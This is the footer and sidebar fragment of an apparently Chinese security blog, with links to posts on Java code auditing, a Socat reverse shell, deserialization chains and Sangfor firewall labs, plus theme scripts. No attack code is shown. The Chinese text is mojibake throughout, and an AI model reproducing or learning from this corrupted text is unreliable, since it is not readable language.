href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" title="åŠ¨æ€ä»£ç†">åŠ¨æ€ä»£ç†</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/Other/011-%E5%8F%8D%E5%BC%B9shell/014-Socat%E5%8F%8D%E5%BC%B9shell/" title="æœªå‘½å">æœªå‘½å</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="åˆ†ç±»äº ç½‘ç»œ">ç½‘ç»œ</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/" title="åˆ†ç±»äº æ·±ä¿¡æœè®¾å¤‡">æ·±ä¿¡æœè®¾å¤‡</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E5%AE%9E%E9%AA%8C/" title="åˆ†ç±»äº å®éªŒ">å®éªŒ</a></div><span><a href="/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E5%AE%9E%E9%AA%8C/AF/AF%E9%83%A8%E7%BD%B2/" title="AFéƒ¨ç½²">AFéƒ¨ç½²</a></span></li></ul></div><div><h2>æœ€æ–°è¯„è®º</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 â€“ <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">ä½™æ˜Ÿé…’ @ ä½™æ˜Ÿé…’</span></div><div class="powered-by">åŸºäº <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"APT/ä»£ç å®¡è®¡/Javaä»£ç å®¡è®¡/ååºåˆ—åŒ–é“¾/CC1/",favicon:{show:"ï¼ˆâ—Â´3ï½€â—ï¼‰ã‚„ã‚Œã‚„ã‚Œã ãœ",hide:"(Â´Ğ”ï½€)å¤§å¤‰ã ï¼"},search:{placeholder:"æ–‡ç« æœç´¢",empty:"å…³äº ã€Œ ${query} ã€ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœåˆ°",stats:"${time} ms å†…æ‰¾åˆ° ${hits} æ¡ç»“æœ"},valine:!0,fancybox:!0,copyright:'å¤åˆ¶æˆåŠŸï¼Œè½¬è½½è¯·éµå®ˆ <i class="ic i-creative-commons"></i>BY-NC-SA åè®®ã€‚',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->